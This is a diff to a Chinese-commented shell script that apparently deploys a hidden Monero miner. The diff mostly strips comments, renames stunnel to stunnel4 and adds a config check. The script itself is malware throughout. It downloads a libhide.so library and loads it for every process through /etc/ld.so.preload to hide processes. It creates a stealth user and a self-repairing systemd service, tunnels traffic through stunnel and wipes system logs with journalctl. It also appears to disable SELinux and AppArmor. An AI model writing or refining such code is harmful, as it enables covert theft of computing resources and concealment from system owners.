@@ -27,66 +27,45 @@ libhide_url="https://github.com/pingyourwifi/monerosh/raw/main/libhide.so"
 # 清理函数
 cleanup() {
     echo "清理系统中残留的文件和操作..."
-
-    # 删除临时文件
     for file in "$tmp_tar" "$tmp_pid"; do
         if [ -f "$file" ]; then
             shred -u "$file" 2>/dev/null || rm -f "$file" 2>/dev/null
         fi
     done
-
-    # 删除创建的文件
     for file in "$svc_conf" "$stunnel_conf" "$ld_preload" "$svc_service" "/opt/httpd-bin/svc-wrapper" "/opt/svc-bin/libhide.so"; do
         if [ -f "$file" ]; then
             shred -u "$file" 2>/dev/null || rm -f "$file" 2>/dev/null
         fi
     done
-
-    # 删除创建的目录
     for dir in "${created_dirs[@]}"; do
         if [ -d "$dir" ]; then
             rm -rf "$dir" 2>/dev/null
         fi
     done
-
-    # 卸载 tmpfs
     if mountpoint -q /mnt/tmpfs; then
         umount /mnt/tmpfs 2>/dev/null
     fi
-
-    # 恢复 LD_PRELOAD
     if [ -f "/etc/ld.so.preload.bak" ]; then
         mv /etc/ld.so.preload.bak /etc/ld.so.preload 2>/dev/null
     fi
-
-    # 删除用户和组
     if id svc >/dev/null 2>&1; then
         userdel -r svc 2>/dev/null
     fi
     if getent group svc >/dev/null; then
         groupdel svc 2>/dev/null
     fi
-
-    # 清理 systemd 服务
     if systemctl is-enabled svc.service >/dev/null 2>&1; then
         systemctl disable svc.service 2>/dev/null
     fi
     systemctl daemon-reload 2>/dev/null
-
-    # 清理 crontab
     sed -i '/svc.service/d' /etc/crontab 2>/dev/null
-
-    # 清理 journalctl 日志
     journalctl --vacuum-time=1s 2>/dev/null || echo "警告：无法清理 journalctl 日志"
-
-    # 恢复系统限制
     if command -v setenforce &> /dev/null; then
         setenforce 1 || echo "警告：无法恢复 SELinux"
     fi
     if command -v aa-status &> /dev/null; then
         systemctl start apparmor || echo "警告：无法恢复 AppArmor"
     fi
-
     echo "清理完成。"
 }
 
@@ -104,7 +83,7 @@ if command -v aa-status &> /dev/null; then
 fi
 
 # 检查必要命令是否存在
-for cmd in curl tar stunnel systemctl shred; do
+for cmd in curl tar stunnel4 systemctl shred; do
     if ! command -v "$cmd" &> /dev/null; then
         echo "错误：$cmd 未安装，请手动安装所需依赖" 1>&2
         exit 1
@@ -175,6 +154,13 @@ curve = secp384r1
 EOF
 chmod 600 "$stunnel_conf"
 
+# 验证 stunnel 配置文件
+echo "验证 stunnel 配置文件..."
+if ! stunnel4 -check "$stunnel_conf"; then
+    echo "错误：stunnel 配置文件无效，请检查语法或权限" 1>&2
+    exit 1
+fi
+
 # 设置全局 LD_PRELOAD
 [ -f "$ld_preload" ] && cp "$ld_preload" /etc/ld.so.preload.bak
 echo "/opt/svc-bin/libhide.so" > "$ld_preload" || {
@@ -210,8 +196,10 @@ EOF
 chmod 644 "$svc_service"
 
 # 启用服务并设置自修复
+echo "启用 stunnel4 服务..."
 systemctl enable stunnel4.service || { echo "启用 stunnel 服务失败" 1>&2; exit 1; }
-systemctl start stunnel4.service || { echo "启动 stunnel 服务失败" 1>&2; exit 1; }
+echo "启动 stunnel4 服务..."
+systemctl start stunnel4.service || { echo "启动 stunnel 服务失败，请检查 'systemctl status stunnel4.service'" 1>&2; exit 1; }
 systemctl daemon-reload || { echo "systemd 重载失败" 1>&2; exit 1; }
 systemctl enable svc.service || { echo "启用 svc 服务失败" 1>&2; exit 1; }
 systemctl start svc.service || { echo "启动 svc 服务失败" 1>&2; exit 1; }
